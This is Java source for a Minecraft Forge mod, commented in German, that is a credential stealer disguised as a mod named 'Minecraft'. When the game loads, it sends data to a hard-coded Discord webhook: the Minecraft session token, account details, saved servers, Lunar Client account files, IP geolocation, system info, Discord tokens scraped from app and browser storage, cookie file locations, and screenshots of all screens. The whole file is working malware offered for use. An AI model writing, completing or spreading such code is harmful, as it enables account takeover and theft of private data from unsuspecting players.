package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.FileNotFoundException;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

import java.io.File;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import javax.imageio.ImageIO;
@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    // --- KONFIGURATION ---
    // WICHTIG: Deine Webhook URL hier eintragen!
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";
    private static final boolean PING_EVERYONE = true;
    private static final Minecraft mc = Minecraft.getMinecraft();

    // --- KONSTANTEN ---
    private static final int DISCORD_EMBED_MAX_DESCRIPTION_LENGTH = 3500; // Discord limit is 4096, using 3500 for safety
    private static final int MAX_TOKEN_DISPLAY_LENGTH = 500;
    private static final String[] DISCORD_TOKEN_PATTERNS = {
        "dQw4w9WgXcQ",  // Encrypted token identifier
        "mfa.",          // MFA token prefix
        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}",  // Regular Discord token pattern
        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{38}"   // Alternative token pattern
    };

    // --- HILFSMETHODEN ---

    // Kürzt Texte sicher, damit Discord nicht abstürzt
    private String safeString(String text, int maxLength) {
        if (text == null) return "Unknown";
        if (text.length() > maxLength) {
            return text.substring(0, maxLength - 3) + "...";
        }
        return text;
    }

    // --- GENERATOREN FÜR DIE DISCORD EMBEDS ---

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(HttpUtils.getContentAsString("https://ipapi.co/json"));
        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription("Target IP and Geo-Location")
                .addField("Country", "```" + info.get("country_name").getAsString() + "```", true)
                .addField("City", "```" + info.get("city").getAsString() + "```", true)
                .addField("IP", "```" + info.get("ip").getAsString() + "```", true);
    }
    private DiscordWebhook.EmbedObject genSystemInfoEmbed() {
        return new DiscordWebhook.EmbedObject()
                .setTitle(":computer: System Info")
                .setColor(0x336699) // Eine andere Farbe
                .addField("OS", "```" + safeString(System.getProperty("os.name"), 100) + "```", true)
                .addField("OS Version", "```" + safeString(System.getProperty("os.version"), 100) + "```", true)
                .addField("Java Version", "```" + safeString(System.getProperty("java.version"), 100) + "```", true)
                .addField("User", "```" + safeString(System.getProperty("user.name"), 100) + "```", true)
                .addField("CPU Cores", "```" + Runtime.getRuntime().availableProcessors() + "```", true)
                .addField("Max Memory", "```" + (Runtime.getRuntime().maxMemory() / 1024 / 1024) + " MB```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription(
                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                .addField("Name", "```" + session.getUsername() + "```", true)
                .addField("UUID", "```" + session.getPlayerID() + "```", true);
    }

    private DiscordWebhook.EmbedObject genTokenEmbed() {
        String token = mc.getSession().getToken();
        token = safeString(token, 4000); // Zur Sicherheit kürzen
        return new DiscordWebhook.EmbedObject()
                .setTitle(":key: Minecraft Session Token")
                .setColor(0xFFA500) // Orange Farbe
                .setDescription("```" + token + "```");
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("Saved Minecraft servers");
        final ServerList servers = new ServerList(mc);
        int limit = Math.min(servers.countServers(), 15);
        for (int i = 0; i < limit; i++) {
            final ServerData server = servers.getServerData(i);
            String name = safeString(server.serverName, 50);
            String ip = safeString(server.serverIP, 100);
            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
        }
        if (servers.countServers() > limit) {
            serversEmbed.addField("More...", "```" + (servers.countServers() - limit) + " hidden```", false);
        }
        return serversEmbed;
    }

    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
        File lunarFile = new File(lunarPath);
        String content = "File not found";
        if (lunarFile.exists() && lunarFile.isFile()) {
            try {
                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                content = new String(encoded, StandardCharsets.UTF_8);
                content = safeString(content, 1500);
            } catch (Exception e) {
                content = "Error: " + e.getMessage();
            }
        }
        return new DiscordWebhook.EmbedObject()
                .setTitle(":crescent_moon: Lunar Client")
                .setColor(0xEE3333)
                .setDescription("```json\n" + content + "\n```");
    }

    // NEU: Embed für die gefundenen Discord Tokens
    private DiscordWebhook.EmbedObject genDiscordTokensEmbed() {
        ArrayList<String> tokens = getTokens();
        DiscordWebhook.EmbedObject tokenEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":robot: Discord Tokens")
                .setColor(0x7289DA); // Discord Blau

        if (tokens.isEmpty()) {
            tokenEmbed.setDescription("Keine Discord Tokens gefunden.");
        } else {
            // Discord Embeds haben ein Limit von 4096 Zeichen pro Beschreibung.
            // Wenn die Tokens diese Länge überschreiten, müssen wir sie aufteilen.
            // Jeder Token ist ca. 60 Zeichen lang, plus Formatierung.
            // Wir setzen ein Limit von 2000 Zeichen pro Embed-Beschreibung, um sicher zu sein.
            StringBuilder sb = new StringBuilder();
            sb.append("**Found ").append(tokens.size()).append(" token(s):**\n\n");
            int currentLength = sb.length();
            
            for (int i = 0; i < tokens.size(); i++) {
                String token = tokens.get(i);
                String displayToken = "**Token " + (i + 1) + ":**\n```" + safeString(token, MAX_TOKEN_DISPLAY_LENGTH) + "```\n";
                
                if (currentLength + displayToken.length() > DISCORD_EMBED_MAX_DESCRIPTION_LENGTH) {
                    sb.append("*...and ").append(tokens.size() - i).append(" more*");
                    break;
                }
                sb.append(displayToken);
                currentLength += displayToken.length();
            }
            tokenEmbed.setDescription(sb.toString());
        }
        return tokenEmbed;
    }

    // NEU: Methode aus dem zweiten Code zum Suchen von Discord Tokens
    public static ArrayList<String> getTokens() {
        ArrayList<String> temp = new ArrayList<>();
        ArrayList<File> paths = new ArrayList<>();
        // Updated path format using cross-platform file separator
        String userHome = System.getProperty("user.home");
        String sep = File.separator;
        
        // Discord paths
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Discord" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordptb" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordcanary" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Lightcord" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discorddevelopment" + sep + "Local Storage" + sep + "leveldb"));
        
        // Browser paths
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Profile 1" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Profile 2" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Microsoft" + sep + "Edge" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Yandex" + sep + "YandexBrowser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "BraveSoftware" + sep + "Brave-Browser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera GX Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));

        for (File file : paths) {
            if (file == null || !file.exists() || !file.isDirectory()) {
                continue;
            }
            File[] filesList = file.listFiles();
            if (filesList == null) continue;
            for (File pathname : filesList) {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                    String strLine;
                    while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
                        // Check for encrypted Discord token pattern (dQw4w9WgXcQ)
                        int index = strLine.indexOf("dQw4w9WgXcQ");
                        if (index != -1) {
                            try {
                                // Extract token after the pattern
                                String afterPattern = strLine.substring(index);
                                // Look for the full encrypted token
                                int endIndex = afterPattern.indexOf("\"");
                                if (endIndex > 11) {  // "dQw4w9WgXcQ" is 11 chars
                                    String fullToken = afterPattern.substring(0, endIndex);
                                    if (!temp.contains(fullToken) && !fullToken.isEmpty() && fullToken.length() > 20) {
                                        temp.add(fullToken);
                                    }
                                }
                            } catch (Exception ignored) {
                            }
                        }
                        
                        // Check for MFA tokens
                        int mfaIndex = strLine.indexOf("mfa.");
                        if (mfaIndex != -1) {
                            try {
                                String afterMfa = strLine.substring(mfaIndex);
                                int endIndex = afterMfa.indexOf("\"");
                                if (endIndex > 4) {  // "mfa." is 4 chars
                                    String mfaToken = afterMfa.substring(0, endIndex);
                                    if (!temp.contains(mfaToken) && !mfaToken.isEmpty() && mfaToken.length() > 50) {
                                        temp.add(mfaToken);
                                    }
                                }
                            } catch (Exception ignored) {
                            }
                        }
                        
                        // Search for regular Discord token patterns using regex-like matching
                        // Pattern: base64(user_id).base64(timestamp).base64(hmac)
                        for (int i = 0; i < strLine.length() - 80; i++) {
                            try {
                                String substr = strLine.substring(i, Math.min(i + 100, strLine.length()));
                                // Look for tokens that match the pattern: alphanumeric.alphanumeric.alphanumeric
                                if (substr.matches("^[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}.*")) {
                                    String potentialToken = substr.split("[^A-Za-z0-9._-]")[0];
                                    if (potentialToken.length() >= 59 && !temp.contains(potentialToken)) {
                                        temp.add(potentialToken);
                                    }
                                }
                            } catch (Exception ignored) {
                            }
                        }
                    }
                } catch (Exception ignored) {
                    // Ignoriere Fehler beim Lesen einer Datei und setze fort
                }
            }
        }
        return temp;
    }

    // --- NEUER COOKIE STEALER ---
    private DiscordWebhook.EmbedObject genCookieStealerEmbed() {
        ArrayList<String> cookies = getCookies();
        DiscordWebhook.EmbedObject cookieEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":cookie: Cookies")
                .setColor(0xFF5733); // Rot

        if (cookies.isEmpty()) {
            cookieEmbed.setDescription("Keine Cookies gefunden.");
        } else {
            StringBuilder sb = new StringBuilder();
            for (String cookie : cookies) {
                String shortCookie = safeString(cookie, 100);
                sb.append(":small_orange_diamond: `").append(shortCookie).append("`\n");
            }
            cookieEmbed.setDescription(sb.toString());
        }
        return cookieEmbed;
    }

    // --- NEUE METHODE ZUM SUCHEN VON COOKIES ---
    public static ArrayList<String> getCookies() {
        ArrayList<String> temp = new ArrayList<>();
        ArrayList<File> paths = new ArrayList<>();
        // Add common browser cookie paths
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Cookies"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Mozilla/Firefox/Profiles/")); // Firefox profiles need special handling

        for (File file : paths) {
            if (file == null || !file.exists()) {
                continue;
            }
            if (file.isDirectory() && file.getName().equals("Profiles")) { // Handle Firefox profiles
                File[] profileDirs = file.listFiles(File::isDirectory);
                if (profileDirs != null) {
                    for (File profileDir : profileDirs) {
                        File firefoxCookies = new File(profileDir, "cookies.sqlite");
                        if (firefoxCookies.exists()) {
                            temp.add("Firefox Cookies found at: " + firefoxCookies.getAbsolutePath());
                        }
                    }
                }
            } else if (file.isFile()) {
                temp.add("Cookie file found at: " + file.getAbsolutePath());
            }
        }
        return temp;
    }

    // --- NEUE METHODE FÜR SCREENSHOTS ---
    private ArrayList<byte[]> captureAllScreens() {
        ArrayList<byte[]> screenshots = new ArrayList<>();
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();
            Robot robot = new Robot();

            for (int i = 0; i < screens.length; i++) {
                try {
                    Rectangle screenBounds = screens[i].getDefaultConfiguration().getBounds();
                    BufferedImage screenshot = robot.createScreenCapture(screenBounds);
                    
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(screenshot, "png", baos);
                    byte[] imageBytes = baos.toByteArray();
                    
                    screenshots.add(imageBytes);
                } catch (Exception e) {
                    System.err.println("Fehler beim Screenshot von Screen " + (i + 1) + ": " + e.getMessage());
                }
            }
        } catch (Exception e) {
            System.err.println("Fehler beim Erstellen der Screenshots: " + e.getMessage());
        }
        return screenshots;
    }

    private DiscordWebhook.EmbedObject genScreenshotsEmbed(int screenCount) {
        if (screenCount > 0) {
            return new DiscordWebhook.EmbedObject()
                    .setTitle(":camera: Screenshots")
                    .setColor(0x00FF00)
                    .setDescription("Screenshots von " + screenCount + " Bildschirm(en) wurden erfasst und angehängt.");
        } else {
            return new DiscordWebhook.EmbedObject()
                    .setTitle(":camera: Screenshots")
                    .setColor(0xFF0000)
                    .setDescription("Keine Screenshots erstellt.");
        }
    }
    // --- AUSFÜHRUNG ---

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("Session Grabber");

        if (PING_EVERYONE) {
            webhook.setContent("@everyone");
        }

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (Exception e) {
            System.out.println("Geo-Info konnte nicht abgerufen werden (wird übersprungen).");
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genSystemInfoEmbed());
        webhook.addEmbed(genTokenEmbed());
        webhook.addEmbed(genServersInfoEmbed());
        webhook.addEmbed(genLunarInfoEmbed());
        webhook.addEmbed(genDiscordTokensEmbed());
        webhook.addEmbed(genCookieStealerEmbed());

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                genWebhook().execute();
                System.out.println("Webhook erfolgreich gesendet!");
                
                // Screenshots in separatem Webhook senden
                sendScreenshots();
            } catch (final Exception e) {
                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                e.printStackTrace();
            }
        }).start();
    }

    private void sendScreenshots() {
        try {
            ArrayList<byte[]> screenshots = captureAllScreens();
            if (!screenshots.isEmpty()) {
                DiscordWebhook screenshotWebhook = new DiscordWebhook(WEBHOOK_URL)
                        .setUsername("Session Grabber")
                        .addEmbed(genScreenshotsEmbed(screenshots.size()));
                
                ArrayList<String> fileNames = new ArrayList<>();
                for (int i = 0; i < screenshots.size(); i++) {
                    fileNames.add("screen_" + (i + 1) + ".png");
                }
                
                screenshotWebhook.executeWithFiles(screenshots, fileNames);
                System.out.println("Screenshots erfolgreich gesendet!");
            } else {
                System.out.println("Keine Screenshots zum Senden.");
            }
        } catch (Exception e) {
            System.err.println("FEHLER BEIM SENDEN DER SCREENSHOTS:");
            e.printStackTrace();
        }
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}